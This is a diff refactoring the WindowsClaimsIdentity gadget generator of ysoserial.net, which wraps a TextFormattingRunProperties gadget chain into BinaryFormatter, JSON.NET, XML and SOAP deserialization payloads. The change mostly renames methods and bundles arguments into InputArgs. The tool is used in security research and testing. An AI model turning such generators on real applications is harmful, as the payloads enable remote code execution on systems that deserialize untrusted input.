@@ -30,14 +30,14 @@ namespace ysoserial.Generators
             return "WindowsClaimsIdentity";
         }
 
-        public override string Credit()
+        public override string Finders()
         {
             return "Soroush Dalili";
         }
 
-        public override bool isDerived()
+        public override List<string> Labels()
         {
-            return true;
+            return new List<string> { GadgetTypes.BridgeAndDerived };
         }
 
         [Serializable]
@@ -66,10 +66,10 @@ namespace ysoserial.Generators
             }
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
+        public override object Generate(string formatter, InputArgs inputArgs)
         {
             Generator generator = new TextFormattingRunPropertiesGenerator();
-            byte[] binaryFormatterPayload = (byte[])generator.Generate(cmd, "BinaryFormatter", false, minify, useSimpleType);
+            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
@@ -77,7 +77,7 @@ namespace ysoserial.Generators
                 || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase))
             {
                 var obj = new WindowsClaimsIdentityMarshal(b64encoded);
-                return Serialize(obj, formatter, test, minify, useSimpleType);
+                return Serialize(obj, formatter, inputArgs);
             }
             else if (formatter.ToLower().Equals("json.net"))
             {
@@ -86,13 +86,21 @@ namespace ysoserial.Generators
                     'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
                 }";
                
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    payload = JSONMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                    
+                    if (inputArgs.UseSimpleType)
+                    {
+                        payload = JSONMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                    }
+                    else
+                    {
+                        payload = JSONMinifier.Minify(payload, null, null);
+                    }
                 }
 
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -114,9 +122,9 @@ namespace ysoserial.Generators
 </root>
 ";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    if (useSimpleType)
+                    if (inputArgs.UseSimpleType)
                     {
                         payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                     }
@@ -126,7 +134,7 @@ namespace ysoserial.Generators
                     }
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -154,9 +162,9 @@ namespace ysoserial.Generators
 </root>
 ";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    if (useSimpleType)
+                    if (inputArgs.UseSimpleType)
                     {
                         payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                     }
@@ -166,7 +174,7 @@ namespace ysoserial.Generators
                     }
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -190,9 +198,9 @@ namespace ysoserial.Generators
 </SOAP-ENV:Envelope>
 ";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    if (useSimpleType)
+                    if (inputArgs.UseSimpleType)
                     {
                         payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null, FormatterType.SoapFormatter);
                     }
@@ -202,7 +210,7 @@ namespace ysoserial.Generators
                     }
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
